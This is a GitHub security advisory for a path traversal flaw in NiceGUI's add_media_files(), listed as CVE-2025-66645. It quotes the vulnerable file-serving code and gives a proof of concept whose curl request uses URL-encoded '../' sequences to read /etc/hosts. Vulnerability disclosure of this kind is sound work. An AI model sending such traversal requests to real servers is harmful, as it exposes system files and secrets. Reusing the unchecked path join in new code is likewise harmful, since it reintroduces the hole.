# [H] NiceGUI has a path traversal in app.add_media_files() allows arbitrary file read

## Summary
Severity: High
Advisory: GHSA-hxp3-63hc-5366
CVE: CVE-2025-66645
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-12-09
Source: https://github.com/advisories/GHSA-hxp3-63hc-5366
Type: github-advisory

## Affected
- PyPI: `nicegui` — affected >=0 <3.4.0

## Details
### Summary

A directory traversal vulnerability in NiceGUI's `App.add_media_files()` allows a remote attacker to read arbitrary files on the server filesystem.

### Details

Hello, I am Seungbin Yang, a university student studying cybersecurity. 
While reviewing the source code of the repository, I discovered a potential vulnerability and successfully verified it with a PoC.

The `App.add_media_files(url_path, local_directory)` method allows users to serve media files. However, the implementation lacks proper path validation.

```python
def add_media_files(self, url_path: str, local_directory: Union[str, Path]) -> None:
    @self.get(url_path.rstrip('/') + '/{filename:path}')
    def read_item(request: Request, filename: str, nicegui_chunk_size: int = 8192) -> Response:
        filepath = Path(local_directory) / filename
        if not filepath.is_file():
            raise HTTPException(status_code=404, detail='Not Found')
        return get_range_response(filepath, request, chunk_size=nicegui_chunk_size)
```
Root Cause:
1. The `{filename:path}` parameter accepts full paths, including traversal sequences like `../`.
2. The code simply joins local_directory and filename without checking if the result is still inside the local_directory.
3. There is no path sanitization or boundary check.

Consequence:
An attacker can use `..` to access files outside the intended directory. If the application has permission, sensitive files (e.g., /etc/hosts, source code, config files) can be exposed.

### POC
1. Create `poc.py`:
```python
# poc.py
from pathlib import Path
from nicegui import app, ui

MEDIA_DIR = Path(__file__).parent / 'media'
MEDIA_DIR.mkdir(exist_ok=True)

# Expose local "media" directory at /media
app.add_media_files('/media', MEDIA_DIR)

@ui.page('/')
def index():
    ui.label('NiceGUI media PoC')

ui.run(port=8080, reload=False)
```

2. Run the application: `python3 poc.py`

3. Exploit with curl: Use URL-encoded dots (`%2e`) to bypass client-side checks.
```curl -v "http://localhost:8080/media/%2e%2e/%2e%2e/%2e%2e/etc/hosts"```


### Result:
The HTTP status is 200 OK, and the response body contains the contents of the server’s /etc/hosts file.

I have attached a screenshot of the successful exploitation below. As shown in the image, the content of /etc/hosts displayed via cat matches the output received from the curl request perfectly.

<img width="1728" height="1078" alt="POC screenshot" src="https://github.com/user-attachments/assets/6c1be75b-6be2-4372-90df-55042c1e4775" />

### Impact

Any NiceGUI application that calls app.add_media_files() on a URL path reachable by an attacker is affected. An unauthenticated remote attacker can read sensitive files outside the intended media directory, potentially exposing:

•Application source code and configuration files
•Credentials, API keys, and secrets
•Operating system configuration files (e.g., /etc/passwd, /etc/hosts)

This is my first github vulnerability report, so I would appreciate your understanding regarding any potential shortcomings. If you require any further information or clarification, please feel free to contact me at y4rvin@naver.com.

Thank you.

## References
- https://github.com/zauberzeug/nicegui/security/advisories/GHSA-hxp3-63hc-5366
- https://nvd.nist.gov/vuln/detail/CVE-2025-66645
- https://github.com/zauberzeug/nicegui/commit/a1b89e2a24e1911a40389ace2153a37f4eea92a9
- https://github.com/zauberzeug/nicegui
